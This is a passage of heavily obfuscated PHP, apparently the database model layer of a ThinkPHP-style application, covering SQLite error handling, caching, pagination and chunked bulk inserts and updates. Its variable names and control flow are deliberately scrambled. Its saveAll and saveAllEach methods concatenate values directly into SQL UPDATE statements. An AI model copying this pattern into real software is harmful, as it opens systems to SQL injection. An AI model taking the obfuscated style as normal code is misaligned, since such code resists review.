$C¦ïèèñŞ‘ => $eÑÌƒ£èù) { $DĞê…¯ˆÓ[$C¦ïèèñŞ‘] = current($eÑÌƒ£èù); } return $DĞê…¯ˆÓ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $dĞ·²©Úğ =& $_SERVER[»„]; $this->error = $this->_linkID->lastErrorMsg(); if ($dĞ·²©Úğ[33] != $this->queryStr) { $this->error .= LNG($dĞ·²©Úğ[45]) . $this->queryStr; } think_trace($this->error, $dĞ·²©Úğ[33], $dĞ·²©Úğ[46]); return $this->error; } public function escapeString($AÜ½¼ª‚Êô) { $bíÃïÁßÍ =& $_SERVER[»„]; if ($this->_linkID) { return $this->_linkID->escapeString($AÜ½¼ª‚Êô); } return str_ireplace($bíÃïÁßÍ[55], $bíÃïÁßÍ[56], $AÜ½¼ª‚Êô); } public function parseLimit($B³â´°Èéğ) { $Aí„ñ¡×§¿ =& $_SERVER[»„]; $D¬‘­ÛÖ¬· = $Aí„ñ¡×§¿[33]; if (!empty($B³â´°Èéğ)) { $B³â´°Èéğ = explode($Aí„ñ¡×§¿[47], $B³â´°Èéğ); if (count($B³â´°Èéğ) > 1) { $D¬‘­ÛÖ¬· .= $Aí„ñ¡×§¿[48] . $B³â´°Èéğ[1] . $Aí„ñ¡×§¿[49] . $B³â´°Èéğ[0] . $Aí„ñ¡×§¿[50]; } else { $D¬‘­ÛÖ¬· .= $Aí„ñ¡×§¿[48] . $B³â´°Èéğ[0] . $Aí„ñ¡×§¿[50]; } } return $D¬‘­ÛÖ¬·; } } goto E¿–ÁàÈÅ; FÀ«•óêÑÁ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\x66\171\124\151\155\145", "\x74\151\155\145", "\151\156\163\145\x72\164\54\165\160\x64\141\164\145", "\146\x75\x6e\143\x74\151\x6f\x6e"), array("\x63\x72\x65\141\x74\x65\x54\x69\x6d\145", "\x74\151\x6d\x65", "\151\156\163\145\162\164", "\146\165\x6e\143\x74\151\x6f\x6e")); public function setDataAuto($fŠ½¥Ú—) { $this->dataAuto = $fŠ½¥Ú—; } public function __construct($A…áØ©ø¼ = '', $f ™»ƒ‰â = '', $c«É´Ÿ‰÷Œ = '') { parent::__construct($A…áØ©ø¼, $f ™»ƒ‰â, $c«É´Ÿ‰÷Œ); } public static function textEncode($EˆíĞŸ„”¨) { if (!$EˆíĞŸ„”¨) { return $EˆíĞŸ„”¨; } $a²ˆÑï’¼‚ = json_encode($EˆíĞŸ„”¨); $a²ˆÑï’¼‚ = preg_replace_callback($_SERVER[»„][338], function ($AòÓ»éË¹) { return addslashes($AòÓ»éË¹[0]); }, $a²ˆÑï’¼‚); return json_decode($a²ˆÑï’¼‚); } public static function textDecode($AÅ¶õù³Š) { $c§¿Ò´ê‡¬ =& $_SERVER[»„]; $aÁ§ğ‡ŠÜ = json_encode($AÅ¶õù³Š); $aÁ§ğ‡ŠÜ = preg_replace_callback($c§¿Ò´ê‡¬[339], function ($FÙÔ¯ÊÌï‹) { return $_SERVER[»„][93]; }, $aÁ§ğ‡ŠÜ); return json_decode($aÁ§ğ‡ŠÜ); } protected $tableMeta = array(); protected function _beforeInsert(&$d¦ŞñŸŒÌÚ, $e¼¹§ õ¥§) { $A¤ÕÈ·ÄÈ =& $_SERVER[»„]; if (!$this->checkDataAutoHas($A¤ÕÈ·ÄÈ[340])) { return; } $this->dataBeforeFilter($d¦ŞñŸŒÌÚ, $A¤ÕÈ·ÄÈ[340]); } protected function _beforeUpdate(&$eÚˆç¨à‰¼, $A¨— ´–ä) { $c°¾¶§…ãó =& $_SERVER[»„]; if (!$this->checkDataAutoHas($c°¾¶§…ãó[341])) { return; } $this->dataBeforeFilter($eÚˆç¨à‰¼, $c°¾¶§…ãó[341]); } protected function _afterSelect(&$c•íøšÕŞª, $fÁ™ë‚ÅùÅ) { if (!is_array($c•íøšÕŞª)) { return; } if (!$this->checkDataAutoHas($_SERVER[»„][342])) { return; } foreach ($c•íøšÕŞª as &$A†àˆ‰­ë) { $this->dataAfterFilter($A†àˆ‰­ë); } } protected function _afterFind(&$Dë°ÒÒÑêŒ, $Däáñ‡º˜¬) { if (!is_array($Dë°ÒÒÑêŒ)) { return; } if (!$this->checkDataAutoHas($_SERVER[»„][342])) { return; } $this->dataAfterFilter($Dë°ÒÒÑêŒ); } public function setAutoIncrement($E­ÀâŞÑ×) { $Fº½ù¥ôÎ = array($this->getPk() => $E­ÀâŞÑ×); $C¨åÆÕ–¹¶ = $this->data($Fº½ù¥ôÎ)->add(); if ($C¨åÆÕ–¹¶) { $this->delete($C¨åÆÕ–¹¶); } } public function getAutoIncrement() { $d–Öã½òçÚ = $this->getTableName(); $c‡±“¥½’Î = $this->max($this->getPk()); $fµ…ÒÍƒ¥“ = $this->query("\x73\x68\x6f\167\40\164\141\142\154\x65\40\x73\164\141\164\165\163\x20\x77\x68\x65\162\145\40\116\141\155\145\x3d\x27{$d–Öã½òçÚ}\x27"); $bËÁù¨õ = $fµ…ÒÍƒ¥“[0][$_SERVER[»„][343]]; $BÕğÈŠõù = max($c‡±“¥½’Î, $bËÁù¨õ); return $BÕğÈŠõù; } protected function _callBefore($E‰ìÌØç¢, $dö¥ìÆì÷†) { return $this->cacheCallCheck($E‰ìÌØç¢, $dö¥ìÆì÷†, !1); } protected function _callAfter($aº§ ³˜Æ›, $Fßİ¦¶™Öã) { return $this->cacheCallCheck($aº§ ³˜Æ›, $Fßİ¦¶™Öã, !0); } protected function cacheFunctionAlias($EÓ»ƒËÍ¶‘) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($FÊÅãóµ, $câÓ¹î¦²Û, $EÑÊâİ²óé = false) { $B–ÀÉ¶Îˆ = $this->cacheFunctionAlias($câÓ¹î¦²Û); if (!$B–ÀÉ¶Îˆ) { return; } foreach ($B–ÀÉ¶Îˆ as $fäºã¼± => $FÊÅ™‡Êù) { $c°òğÖÛê = $FÊÅ™‡Êù[0]; $FÛŞ¿­ÀØ = explode($_SERVER[»„][47], $FÊÅ™‡Êù[1]); if ($FÊÅãóµ == $fäºã¼±) { return $this->cacheFunctionGet($fäºã¼±, $c°òğÖÛê); } if ($EÑÊâİ²óé && in_array($FÊÅãóµ, $FÛŞ¿­ÀØ)) { $this->cacheFunctionClear($fäºã¼±, $c°òğÖÛê); } } } public function cacheFunctionGet($AÒ›×…î«, $bŠæ°¬å‚) { $bÁá²öñô = $this->cacheKeyMake($AÒ›×…î«, $bŠæ°¬å‚); $Bæº¨ª„‡Ÿ = Cache::get($bÁá²öñô); if (!is_array($Bæº¨ª„‡Ÿ)) { $Bæº¨ª„‡Ÿ = call_user_func_array(array($this, $AÒ›×…î«), array($bŠæ°¬å‚, !0)); Cache::set($bÁá²öñô, $Bæº¨ª„‡Ÿ); } return $Bæº¨ª„‡Ÿ; } public function cacheFunctionClear($EôÛŒÀ©‡, $cÛ—İàÈ”–) { $f¹ãôç¯Ø‡ = $cÛ—İàÈ”–; if (!is_array($cÛ—İàÈ”–)) { $f¹ãôç¯Ø‡ = array($cÛ—İàÈ”–); } foreach ($f¹ãôç¯Ø‡ as $d±¶Ì÷¹„) { $a´¯…«ª°‡ = $this->cacheKeyMake($EôÛŒÀ©‡, $d±¶Ì÷¹„); Cache::remove($a´¯…«ª°‡); } } private function cacheKeyMake($fÙ‚Ü…Ü¤ç, $a§µÇ˜–ƒ§) { $E­êª‚ÇÇó =& $_SERVER[»„]; return get_class($this) . $E­êª‚ÇÇó[70] . $fÙ‚Ü…Ü¤ç . $E­êª‚ÇÇó[344] . $a§µÇ˜–ƒ§; } protected function selectPage($e©—÷İ¬ = 200, $F¨ÇÊ’à³ = 1) { goto dáƒï’¯ø; fãİõà’ä: $Bš¢ŒíœÑ™ = ceil($EéÒ¢ÆÁ„Â / $e©—÷İ¬); $F¨ÇÊ’à³ = intval(isset($in[$B½ç‡âğ·Æ[336]]) ? $in[$B½ç‡âğ·Æ[336]] : $F¨ÇÊ’à³); $F¨ÇÊ’à³ = $F¨ÇÊ’à³ <= 1 ? 1 : ($F¨ÇÊ’à³ >= $Bš¢ŒíœÑ™ ? $Bš¢ŒíœÑ™ : $F¨ÇÊ’à³); goto e—  ­ÙØ; CÈ’¤â¥‡: $DåÌ‡Ÿ²‰¸ = $eñ“ÆÀáœ; $DåÌ‡Ÿ²‰¸[$B½ç‡âğ·Æ[346]] = array(); $this->optionsValue($DåÌ‡Ÿ²‰¸); goto C°‘é•¹‘²; e—  ­ÙØ: $this->optionsValue($eñ“ÆÀáœ); $CàÔ£‡³¤Ô = $this->page($F¨ÇÊ’à³, $e©—÷İ¬)->select(); $CàÔ£‡³¤Ô = is_array($CàÔ£‡³¤Ô) ? $CàÔ£‡³¤Ô : array(); goto aêÕ×¥‘; dáƒï’¯ø: $B½ç‡âğ·Æ =& $_SERVER[»„]; global $in; $eñ“ÆÀáœ = $this->optionsValue(); goto bÖÅ‘óŒ‰«; C°‘é•¹‘²: $EéÒ¢ÆÁ„Â = intval($this->count()); $e©—÷İ¬ = intval($e©—÷İ¬); $e©—÷İ¬ = $e©—÷İ¬ <= 5 ? 5 : ($e©—÷İ¬ >= $b›Ë±Ôõ†µ ? $b›Ë±Ôõ†µ : $e©—÷İ¬); goto fãİõà’ä; bÖÅ‘óŒ‰«: $b›Ë±Ôõ†µ = 4000; $e©—÷İ¬ = isset($in[$B½ç‡âğ·Æ[345]]) ? $in[$B½ç‡âğ·Æ[345]] : $e©—÷İ¬; if ($e©—÷İ¬ === -1) { unset($in[$B½ç‡âğ·Æ[345]]); $b›Ë±Ôõ†µ = 100000000; $e©—÷İ¬ = $b›Ë±Ôõ†µ; } goto CÈ’¤â¥‡; aêÕ×¥‘: if ($Bš¢ŒíœÑ™ == 1) { $EéÒ¢ÆÁ„Â = count($CàÔ£‡³¤Ô); } $a‰ÓØ±º = array($B½ç‡âğ·Æ[347] => array($B½ç‡âğ·Æ[348] => $EéÒ¢ÆÁ„Â, $B½ç‡âğ·Æ[345] => $e©—÷İ¬, $B½ç‡âğ·Æ[336] => $F¨ÇÊ’à³, $B½ç‡âğ·Æ[349] => $Bš¢ŒíœÑ™), $B½ç‡âğ·Æ[350] => $CàÔ£‡³¤Ô ? $CàÔ£‡³¤Ô : array()); return $a‰ÓØ±º; goto eäŒ¸á–Ğ‰; eäŒ¸á–Ğ‰: } protected function checkLength($e£’õÁÑœ, $FÓ¾›Ô¶â = 0, $B©Ä·õØ´Ü = '') { $F¾ˆòĞ•›ô =& $_SERVER[»„]; $FÓ¾›Ô¶â = $FÓ¾›Ô¶â ? $FÓ¾›Ô¶â : 65536; if (!$e£’õÁÑœ || strlen($e£’õÁÑœ) < $FÓ¾›Ô¶â) { return; } $B©Ä·õØ´Ü = $B©Ä·õØ´Ü ? $B©Ä·õØ´Ü . $F¾ˆòĞ•›ô[67] : $F¾ˆòĞ•›ô[33]; show_json($B©Ä·õØ´Ü . LNG($F¾ˆòĞ•›ô[351]) . "\50{$FÓ¾›Ô¶â}\x29", !1); } protected function metaSet($A—¤†¢Š‘‡, $E¶›ÊÏ…äñ = null, $D™¼Ûœ™®‡ = null) { goto AØ¸ô’„; Dó…Îè¸¡†: $DÖ‘—‹ƒÎé = $this->tableMeta[$FÄôĞ³½çœ[353]]; $dÁèõÂô¡ = Model($DÖ‘—‹ƒÎé); $AÜ‚’´‚‹ = array($d™ŠŒ¿ã¯¤ => $A—¤†¢Š‘‡, $FÄôĞ³½çœ[354] => $E¶›ÊÏ…äñ); goto aŠğø†íÉ; AÛñŞ‹‚: $dÁèõÂô¡->where(array($d™ŠŒ¿ã¯¤ => $A—¤†¢Š‘‡))->addAll($B¾Ö¯ÕÛ­, array(), !0); return !0; goto E÷ßİœ©ä×; AØ¸ô’„: $FÄôĞ³½çœ =& $_SERVER[»„]; if (!$this->tableMeta) { return !1; } $d™ŠŒ¿ã¯¤ = $this->tableMeta[$FÄôĞ³½çœ[352]]; goto Dó…Îè¸¡†; cÙ¡ºÅõ·ì: if (is_string($E¶›ÊÏ…äñ)) { $aÑæãí‚·ƒ[$E¶›ÊÏ…äñ] = $D™¼Ûœ™®‡; } $B¾Ö¯ÕÛ­ = array(); foreach ($aÑæãí‚·ƒ as $a™½­‹ÂĞ => $b’¦×¿«Íã) { $this->checkLength($b’¦×¿«Íã, !1, $DÖ‘—‹ƒÎé . $FÄôĞ³½çœ[4] . $a™½­‹ÂĞ); $B¾Ö¯ÕÛ­[] = array($d™ŠŒ¿ã¯¤ => $A—¤†¢Š‘‡, $FÄôĞ³½çœ[89] => $a™½­‹ÂĞ, $FÄôĞ³½çœ[355] => $b’¦×¿«Íã); } goto AÛñŞ‹‚; aŠğø†íÉ: if (is_null($E¶›ÊÏ…äñ)) { return $dÁèõÂô¡->where(array($d™ŠŒ¿ã¯¤ => $A—¤†¢Š‘‡))->delete(); } if (is_null($D™¼Ûœ™®‡)) { return $dÁèõÂô¡->where($AÜ‚’´‚‹)->delete(); } $aÑæãí‚·ƒ = is_array($E¶›ÊÏ…äñ) ? $E¶›ÊÏ…äñ : array(); goto cÙ¡ºÅõ·ì; E÷ßİœ©ä×: } public function metaGet($cõ‚¾‹íÎ) { goto aœğ¬½ö§; aœğ¬½ö§: $CÊ–Û‚Å•ñ =& $_SERVER[»„]; if (!$this->tableMeta) { return array(); } $FÕ§¹©Î¡è = $this->tableMeta[$CÊ–Û‚Å•ñ[352]]; goto AİÄ÷Şè¬İ; eç…İŸã«Š: $f¸¤ÛÅ´ÓË = array_to_keyvalue($f¸¤ÛÅ´ÓË, $CÊ–Û‚Å•ñ[89], $CÊ–Û‚Å•ñ[355]); return $f¸¤ÛÅ´ÓË; goto a¹¶‘³Éˆ¬; AİÄ÷Şè¬İ: $DÕÃùĞìÄÁ = Model($this->tableMeta[$CÊ–Û‚Å•ñ[353]]); $BÏñÂ”´æğ = array($FÕ§¹©Î¡è => $cõ‚¾‹íÎ); $f¸¤ÛÅ´ÓË = $DÕÃùĞìÄÁ->field($CÊ–Û‚Å•ñ[356])->where($BÏñÂ”´æğ)->select(); goto eç…İŸã«Š; a¹¶‘³Éˆ¬: } private function checkDataAutoHas($Cáª²ó£çÚ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $a«Ò¥ÒÖ¦†) { if (in_array($Cáª²ó£çÚ, explode($_SERVER[»„][47], $a«Ò¥ÒÖ¦†[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$f†­Ï­ôŞµ, $Aœµ™ÒŠÛ) { $e„‘ÈÄÌò® =& $_SERVER[»„]; foreach ($this->dataAuto as $EÊ¼¼„êá·) { $AÏæÜƒ´´µ = $EÊ¼¼„êá·[0]; if (!in_array($Aœµ™ÒŠÛ, explode($e„‘ÈÄÌò®[47], $EÊ¼¼„êá·[2]))) { continue; } switch (trim($EÊ¼¼„êá·[3])) { case $e„‘ÈÄÌò®[305]: case $e„‘ÈÄÌò®[306]: $E•¼“š‰à = $EÊ¼¼„êá·[1]; $cè˜Ãå‘Ç® = isset($EÊ¼¼„êá·[4]) ? (array) $EÊ¼¼„êá·[4] : array(); if ($E•¼“š‰à == $e„‘ÈÄÌò®[186] && array_key_exists($AÏæÜƒ´´µ, $f†­Ï­ôŞµ)) { if (!$f†­Ï­ôŞµ[$AÏæÜƒ´´µ]) { unset($f†­Ï­ôŞµ[$AÏæÜƒ´´µ]); } break; } if (isset($f†­Ï­ôŞµ[$AÏæÜƒ´´µ])) { array_unshift($cè˜Ãå‘Ç®, $f†­Ï­ôŞµ[$AÏæÜƒ´´µ]); } if ($e„‘ÈÄÌò®[305] == $EÊ¼¼„êá·[3]) { $f†­Ï­ôŞµ[$AÏæÜƒ´´µ] = call_user_func_array($E•¼“š‰à, $cè˜Ãå‘Ç®); } else { $f†­Ï­ôŞµ[$AÏæÜƒ´´µ] = call_user_func_array(array(&$this, $E•¼“š‰à), $cè˜Ãå‘Ç®); } break; case $e„‘ÈÄÌò®[257]: $f†­Ï­ôŞµ[$AÏæÜƒ´´µ] = $f†­Ï­ôŞµ[$EÊ¼¼„êá·[1]]; break; case $e„‘ÈÄÌò®[278]: if (isset($f†­Ï­ôŞµ[$AÏæÜƒ´´µ]) && !is_string($f†­Ï­ôŞµ[$AÏæÜƒ´´µ])) { $f†­Ï­ôŞµ[$AÏæÜƒ´´µ] = json_encode_force($f†­Ï­ôŞµ[$AÏæÜƒ´´µ]); } break; case $e„‘ÈÄÌò®[307]: if ($f†­Ï­ôŞµ[$AÏæÜƒ´´µ] === $e„‘ÈÄÌò®[33]) { unset($f†­Ï­ôŞµ[$AÏæÜƒ´´µ]); } break; case $e„‘ÈÄÌò®[308]: $f†­Ï­ôŞµ[$AÏæÜƒ´´µ] = $EÊ¼¼„êá·[1]; default: break; } } if ($Aœµ™ÒŠÛ == $e„‘ÈÄÌò®[340]) { $BÄ•´À˜™ë = strtolower($this->db->getDbType()); if (strpos($BÄ•´À˜™ë, $e„‘ÈÄÌò®[9]) !== 0) { return; } $bÖ¶Ù¼ĞÄ­ = $this->field(!0)->fields; $C®èˆÄ¨‚ = $bÖ¶Ù¼ĞÄ­[$e„‘ÈÄÌò®[236]]; if (isset($bÖ¶Ù¼ĞÄ­[$e„‘ÈÄÌò®[235]])) { unset($C®èˆÄ¨‚[$bÖ¶Ù¼ĞÄ­[$e„‘ÈÄÌò®[235]]]); } foreach ($C®èˆÄ¨‚ as $eêÆ¨–áºí => $Aœµ™ÒŠÛ) { if (!isset($f†­Ï­ôŞµ[$eêÆ¨–áºí])) { $f†­Ï­ôŞµ[$eêÆ¨–áºí] = $e„‘ÈÄÌò®[33]; } } } } private function dataAfterFilter(&$aé£àŞŸÊ´) { $f®¹ŸºŒŞÜ =& $_SERVER[»„]; foreach ($this->dataAuto as $eÕëä©®¡ê) { $EÂéÅÁ ‘‡ = $eÕëä©®¡ê[0]; if (!in_array($f®¹ŸºŒŞÜ[342], explode($f®¹ŸºŒŞÜ[47], $eÕëä©®¡ê[2]))) { continue; } if (!isset($aé£àŞŸÊ´[$EÂéÅÁ ‘‡])) { continue; } switch (trim($eÕëä©®¡ê[3])) { case $f®¹ŸºŒŞÜ[305]: case $f®¹ŸºŒŞÜ[306]: $f‚«µ„Âç» = isset($eÕëä©®¡ê[4]) ? (array) $eÕëä©®¡ê[4] : array(); array_unshift($f‚«µ„Âç», $aé£àŞŸÊ´[$EÂéÅÁ ‘‡]); if ($f®¹ŸºŒŞÜ[305] == $eÕëä©®¡ê[3]) { $aé£àŞŸÊ´[$EÂéÅÁ ‘‡] = call_user_func_array($eÕëä©®¡ê[1], $f‚«µ„Âç»); } else { $aé£àŞŸÊ´[$EÂéÅÁ ‘‡] = call_user_func_array(array(&$this, $eÕëä©®¡ê[1]), $f‚«µ„Âç»); } break; case $f®¹ŸºŒŞÜ[257]: $aé£àŞŸÊ´[$EÂéÅÁ ‘‡] = $aé£àŞŸÊ´[$eÕëä©®¡ê[1]]; break; case $f®¹ŸºŒŞÜ[278]: $A·¬ô»Š†È = $aé£àŞŸÊ´[$EÂéÅÁ ‘‡]; $aé£àŞŸÊ´[$EÂéÅÁ ‘‡] = json_decode($A·¬ô»Š†È, !0); if (is_null($aé£àŞŸÊ´[$EÂéÅÁ ‘‡])) { $aé£àŞŸÊ´[$EÂéÅÁ ‘‡] = $A·¬ô»Š†È; } break; case $f®¹ŸºŒŞÜ[307]: if ($aé£àŞŸÊ´[$EÂéÅÁ ‘‡] === $f®¹ŸºŒŞÜ[33]) { unset($aé£àŞŸÊ´[$EÂéÅÁ ‘‡]); } break; case $f®¹ŸºŒŞÜ[308]: $aé£àŞŸÊ´[$EÂéÅÁ ‘‡] = $eÕëä©®¡ê[1]; default: break; } } } public function saveAll($b”·¡ê„¸) { goto a§›¶ëÜ…‡; a§›¶ëÜ…‡: $a‰ˆ£­œ¨ =& $_SERVER[»„]; $c¬Åµ®×ë¢ = $this->tablePrefix . $this->tableName; $D‰´ŒÒ™î± = self::SQL_WHERE_IN_CHUNK; goto b¥¸ğëÇ°è; Dòï‚ø¤†Ú: $this->chunkEventSet(); goto f¡Õ“‰ã‚Š; dèÑ¾’â: $Eğ‹Ş¡ÈŒ³ = array(); $fÊÕà—“ = count($b”·¡ê„¸); for ($CÃŸ©™Šˆ = 0; $CÃŸ©™Šˆ < $fÊÕà—“; $CÃŸ©™Šˆ++) { $F”‰âßÍ÷Á = $b”·¡ê„¸[$CÃŸ©™Šˆ]; if (!is_array($F”‰âßÍ÷Á) || count($F”‰âßÍ÷Á) != 4) { continue; } $BùÂë¡àĞ = "\x55\120\104\101\x54\105\40{$c¬Åµ®×ë¢}\40\123\105\124\x20{$F”‰âßÍ÷Á[2]}\x20\75\40\x43\x41\123\105\x20{$F”‰âßÍ÷Á[0]}\40\xa"; if ($F­áÁŸªè† == 0) { $BïŞèé¬Èƒ = $BùÂë¡àĞ; } $Eğ‹Ş¡ÈŒ³[] = $a‰ˆ£­œ¨[112] . $F”‰âßÍ÷Á[1] . $a‰ˆ£­œ¨[112]; $F­áÁŸªè†++; $BïŞèé¬Èƒ .= "\x20\127\x48\x45\x4e\x20\47{$F”‰âßÍ÷Á[1]}\x27\x20\x54\x48\105\x4e\x20\47{$F”‰âßÍ÷Á[3]}\x27\40\12"; if ($F­áÁŸªè† == $D‰´ŒÒ™î± || $CÃŸ©™Šˆ == $fÊÕà—“ - 1) { goto Aã¹ÆÇ…¾ì; Aã¹ÆÇ…¾ì: $C…ŠŒ•ğîó = implode($a‰ˆ£­œ¨[47], $Eğ‹Ş¡ÈŒ³); $BïŞèé¬Èƒ .= "\x20\105\116\104\40\40\127\x48\105\x52\105\40{$F”‰âßÍ÷Á[0]}\40\111\116\40\x28{$C…ŠŒ•ğîó}\51\x20"; $this->execute($BïŞèé¬Èƒ); goto fµª¶Ş®ßé; fµª¶Ş®ßé: $F­áÁŸªè† = 0; $BïŞèé¬Èƒ = $BùÂë¡àĞ; $this->chunkEventCheck(count($Eğ‹Ş¡ÈŒ³)); goto AâÀÈšÌÀ; AâÀÈšÌÀ: $Eğ‹Ş¡ÈŒ³ = array(); goto eŞÆî¼ÓùØ; eŞÆî¼ÓùØ: } } goto Dòï‚ø¤†Ú; b¥¸ğëÇ°è: $b”·¡ê„¸ = is_array($b”·¡ê„¸) ? $b”·¡ê„¸ : array(); $BïŞèé¬Èƒ = $a‰ˆ£­œ¨[357]; $F­áÁŸªè† = 0; goto dèÑ¾’â; f¡Õ“‰ã‚Š: } public function saveAllEach($dĞŒ³òŒ ) { $eÉÛªÓôÚ =& $_SERVER[»„]; $BÂŠšôï¶³ = $this->tablePrefix . $this->tableName; foreach ($dĞŒ³òŒ  as $BµÜŠë´Ã¹) { if (!is_array($BµÜŠë´Ã¹) || count($BµÜŠë´Ã¹) != 4) { continue; } $cƒ’ä‹ùÎ¢ = $BµÜŠë´Ã¹[0] . $eÉÛªÓôÚ[358] . $BµÜŠë´Ã¹[1] . $eÉÛªÓôÚ[112]; $DŸŞŞ¦Í = $BµÜŠë´Ã¹[2] . $eÉÛªÓôÚ[358] . $BµÜŠë´Ã¹[3] . $eÉÛªÓôÚ[112]; $CğÌÉ¿Ø•­ = "\x75\160\x64\141\164\x65\x20{$BÂŠšôï¶³}\40\x73\x65\x74\x20{$DŸŞŞ¦Í}\x20\167\150\145\162\x65\40{$cƒ’ä‹ùÎ¢}\x3b"; $this->execute($CğÌÉ¿Ø•­); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($b³†îŒ± = false, $C¾öŒËŠÁÛ = false) { $this->_chunkEvent = $b³†îŒ±; $this->_chunkEventParam = $C¾öŒËŠÁÛ; } private function chunkEventCheck($Dˆ˜ø³¿ó®) { if (!$this->_chunkEvent) { return; } $CàİÖß× = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $CàİÖß×[$_SERVER[»„][359]] = $Dˆ˜ø³¿ó®; Hook::trigger($this->_chunkEvent, $CàİÖß×); } public function addAll($bò‡¢ã•²°, $cñ’¹™¹«Š = array(), $FÈÕõõÎ… = false) { goto eöÊÜˆ°ÌÄ; eöÊÜˆ°ÌÄ: $f˜ğŸ‘ØçÍ =& $_SERVER[»„]; ignore_timeout(); $Bä¡ÍìÓ± = self::SQL_WHERE_IN_CHUNK; goto bŒ×½å§ğ; bŒ×½å§ğ: if (empty($bò‡¢ã•²°)) { $this->error = think_lang($f˜ğŸ‘ØçÍ[255]); return !1; } $cñ’¹™¹«Š = $this->_parseOptions($cñ’¹™¹«Š); foreach ($bò‡¢ã•²° as $aåß•Ğ‡¤ó => $EØµê¾Ê¾‰) { $bò‡¢ã•²°[$aåß•Ğ‡¤ó] = $this->_facade($EØµê¾Ê¾‰); $this->_beforeInsert($bò‡¢ã•²°[$aåß•Ğ‡¤ó], $cñ’¹™¹«Š); } goto E‡ƒ¡ïê°è; E‡ƒ¡ïê°è: if (method_exists($this->db, $f˜ğŸ‘ØçÍ[256])) { for ($cä£øŠ”Ú‡ = 0; $cä£øŠ”Ú‡ < count($bò‡¢ã•²°); $cä£øŠ”Ú‡ += $Bä¡ÍìÓ±) { $CÛ’Æš« = array_slice($bò‡¢ã•²°, $cä£øŠ”Ú‡, $Bä¡ÍìÓ±); if (!is_array($CÛ’Æš«) || count($CÛ’Æš«) == 0) { break; } $f£çĞá¯…Ì = $this->db->insertAll($CÛ’Æš«, $cñ’¹™¹«Š, $FÈÕõõÎ…); $this->chunkEventCheck(count($CÛ’Æš«)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($bò‡¢ã•²° as $aåß•Ğ‡¤ó => $EØµê¾Ê¾‰) { $f£çĞá¯…Ì = $this->db->insert($EØµê¾Ê¾‰, $cñ’¹™¹«Š, $FÈÕõõÎ…); } $this->commit(); } if (!1 !== $f£çĞá¯…Ì) { $DßìÔ…‰ÓÉ = $this->getLastInsID(); if ($DßìÔ…‰ÓÉ) { return $DßìÔ…‰ÓÉ; } } return $f£çĞá¯…Ì; goto cÌÊ…Û¿ñˆ; cÌÊ…Û¿ñˆ: } public function save($BŠ¤„ËÇä‡ = '', $a­ê®æ¡“¿ = array()) { goto b³ÆÚšÃ¿İ; E¯²®Åœº‡: $A¥Ñí¤ÑÛ = $a«‹äê¨Ï[$cãÕ‘¥¤š[259]][$Bö‡ËËØÕŸ][1]; $A¥Ñí¤ÑÛ = is_array($A¥Ñí¤ÑÛ) ? $A¥Ñí¤ÑÛ : array(); $D¨‚Ş•¾‡ = count($A¥Ñí¤ÑÛ); goto Eéóáƒ‘Ï; b‹áçÃ´ÁÑ: $Bö‡ËËØÕŸ = $this->findWhereField($a«‹äê¨Ï); if (!$Bö‡ËËØÕŸ) { return parent::save($BŠ¤„ËÇä‡, $a­ê®æ¡“¿); } $d‰®®™œİš = 0; goto E¯²®Åœº‡; b³ÆÚšÃ¿İ: $cãÕ‘¥¤š =& $_SERVER[»„]; $a‹£÷ôîÆÏ = self::SQL_WHERE_IN_CHUNK; $a«‹äê¨Ï = $this->optionsValue(); goto b‹áçÃ´ÁÑ; Eéóáƒ‘Ï: for ($e”ÙìàÜÍ = 0; $e”ÙìàÜÍ < $D¨‚Ş•¾‡; $e”ÙìàÜÍ += $a‹£÷ôîÆÏ) { $EƒòÍŒ“¨Ä = array_slice($A¥Ñí¤ÑÛ, $e”ÙìàÜÍ, $a‹£÷ôîÆÏ); if (!is_array($EƒòÍŒ“¨Ä) || count($EƒòÍŒ“¨Ä) == 0) { break; } $a«‹äê¨Ï[$cãÕ‘¥¤š[259]][$Bö‡ËËØÕŸ][1] = $EƒòÍŒ“¨Ä; $this->optionsValue($a«‹äê¨Ï); $d‰®®™œİš += parent::save($BŠ¤„ËÇä‡, $a­ê®æ¡“¿); $this->chunkEventCheck(count($EƒòÍŒ“¨Ä)); } $this->chunkEventSet(); return $d‰®®™œİš; goto fˆë„«ç; fˆë„«ç: } public function add($f›“ì²â’ = '', $BôˆÓóö  = array(), $c®ãÒ“À’ù = false) { if ($this->addTaskStatus && is_array($f›“ì²â’)) { $this->addTaskData[] = $f›“ì²â’; return; } return parent::add($f›“ì²â’, $BôˆÓóö , $c®ãÒ“À’ù); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($E™´ïáÔôà = array()) { goto bñ¨±èË——; b°ñª„¤: $E¾‹¬ÆÆ = $this->findWhereField($C±ª¬ŸÔæÀ); if (!$E¾‹¬ÆÆ || isset($C±ª¬ŸÔæÀ[$Béà„„ùÖô[276]]) || isset($C±ª¬ŸÔæÀ[$Béà„„ùÖô[336]])) { return parent::select($E™´ïáÔôà); } $e°ŞóóÈâƒ = $C±ª¬ŸÔæÀ[$Béà„„ùÖô[259]][$E¾‹¬ÆÆ][1]; goto cøª™ÅØéö; bñ¨±èË——: $Béà„„ùÖô =& $_SERVER[»„]; $CÇ½²çİõ— = self::SQL_WHERE_IN_CHUNK; $C±ª¬ŸÔæÀ = $this->optionsValue(); goto b°ñª„¤; BÚÖË¿î—: return $EŠ£ä•ñ•¦; goto bÈîø‘˜•; cøª™ÅØéö: $e°ŞóóÈâƒ = is_array($e°ŞóóÈâƒ) ? $e°ŞóóÈâƒ : array(); $EŠ£ä•ñ•¦ = null; for ($C¹ÅàŠØ¢ = 0; $C¹ÅàŠØ¢ < count($e°ŞóóÈâƒ); $C¹ÅàŠØ¢ += $CÇ½²çİõ—) { $A¾Ÿ‚‚°ª  = array_slice($e°ŞóóÈâƒ, 